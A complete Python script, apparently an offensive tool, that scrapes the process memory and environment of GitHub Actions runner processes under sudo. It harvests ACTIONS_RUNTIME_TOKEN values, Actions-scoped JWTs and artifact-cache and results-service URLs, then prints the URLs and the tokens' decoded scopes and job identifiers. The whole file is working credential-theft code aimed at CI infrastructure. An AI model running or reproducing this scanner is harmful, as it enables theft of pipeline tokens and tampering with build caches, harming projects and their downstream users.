#!/usr/bin/env python3
# i11100 memscan: recover runtime token + cache/results URLs from Runner.Worker mem (run with sudo).
import os, re, json, base64, time

def rd(p):
    try: return open(p, 'rb').read()
    except Exception: return b''

def read_mem(pid, deadline, max_total=1_200_000_000):
    maps = rd('/proc/%d/maps' % pid).decode('utf8', 'replace')
    regions = []
    for line in maps.splitlines():
        p = line.split()
        if len(p) < 2 or 'r' not in p[1]: continue
        try:
            a, b = p[0].split('-'); regions.append((int(a, 16), int(b, 16)))
        except Exception: continue
    bufs = []
    try: fd = os.open('/proc/%d/mem' % pid, os.O_RDONLY)
    except Exception as e: print('OPEN_MEM_ERR', e); return []
    try:
        for (a, b) in regions:
            if time.time() > deadline: break
            size = b - a
            if size <= 0 or size > 512 * 1024 * 1024: continue
            try: buf = os.pread(fd, size, a)
            except Exception: continue
            if buf: bufs.append(buf)
    finally: os.close(fd)
    return bufs

def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b'=' * (-len(s) % 4))

def claims(tok):
    try:
        ps = tok.decode('ascii', 'replace').split('.')
        if len(ps) < 2: return None
        return json.loads(b64u(ps[1]))
    except Exception: return None

def main():
    print('SCANNER_START')
    pids = [int(d) for d in os.listdir('/proc') if d.isdigit() and
            rd('/proc/%s/comm' % d).decode('utf8', 'replace').strip() in ('Runner.Worker', 'Runner.Listener')]
    print('RUNNER_PIDS', pids)
    RTS = {}; URLS = set()
    RE_URL = re.compile(rb'https://(?:artifactcache|results-receiver|pipelines|vstoken)\.actions\.githubusercontent\.com[^\x00\s"\']{0,200}')
    RE_RT = re.compile(rb'ACTIONS_RUNTIME_TOKEN=([A-Za-z0-9_\-\.]{60,})')
    RE_JWT = re.compile(rb'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{6,}')
    for pid in pids:
        for e in rd('/proc/%d/environ' % pid).split(b'\x00'):
            if e.startswith(b'ACTIONS_RUNTIME_TOKEN='): RTS[e.split(b'=', 1)[1]] = 'environ'
        for b in read_mem(pid, time.time() + 150):
            for m in RE_RT.finditer(b): RTS[m.group(1)] = 'mem'
            for m in RE_URL.finditer(b): URLS.add(m.group(0))
            for m in RE_JWT.finditer(b):
                c = claims(m.group(0))
                if c and (str(c.get('aud', '')).startswith('vso:') or 'Actions.' in str(c.get('scp', ''))):
                    RTS[m.group(0)] = 'mem-jwt'
    print('RT_COUNT', len(RTS), 'URL_COUNT', len(URLS))
    for u in sorted(URLS):
        print('URL', u.decode('utf8', 'replace')[:230])
    seen = set()
    for t in list(RTS):
        c = claims(t)
        if not c: continue
        key = json.dumps({k: c.get(k) for k in ('aud', 'scp')})
        if key in seen: continue
        seen.add(key)
        print('RT len=%d aud=%s' % (len(t), c.get('aud')))
        print('   SCP=%s' % str(c.get('scp'))[:250])
        print('   plan=%s job=%s run=%s' % (c.get('plan_id'), c.get('job_id'), c.get('run_id')))
    print('SCANNER_DONE')

if __name__ == '__main__':
    main()
